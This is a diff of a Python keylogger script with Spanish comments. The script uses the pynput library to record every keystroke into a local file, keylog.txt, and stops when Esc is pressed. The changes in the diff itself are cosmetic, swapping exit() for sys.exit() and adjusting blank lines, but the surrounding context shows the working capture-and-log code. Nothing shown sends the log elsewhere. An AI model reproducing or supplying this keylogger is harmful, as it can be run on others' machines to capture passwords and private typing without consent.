@@ -1,13 +1,16 @@
 import os
+import sys
+
 try:
     from pynput.keyboard import Key, Listener
 except ImportError:
     print("Error: La librería 'pynput' no está instalada.")
     print("Por favor, instálala con: pip install pynput")
-    exit()
+    sys.exit()
 
 # Configuración del archivo de log
 log_file = "keylog.txt"
+
 
 def on_press(key):
     """
@@ -16,7 +19,7 @@ def on_press(key):
     try:
         # Intentamos obtener el carácter de la tecla
         k = str(key).replace("'", "")
-        
+
         # Formateo de teclas especiales para legibilidad
         if k == "Key.space":
             k = " "
@@ -32,9 +35,10 @@ def on_press(key):
         # Escribimos en el archivo
         with open(log_file, "a", encoding="utf-8") as f:
             f.write(k)
-            
+
     except Exception as e:
         print(f"Error al registrar tecla: {e}")
+
 
 def on_release(key):
     """
@@ -44,6 +48,7 @@ def on_release(key):
     if key == Key.esc:
         print("\nDeteniendo el keylogger...")
         return False
+
 
 if __name__ == "__main__":
     print("-" * 50)
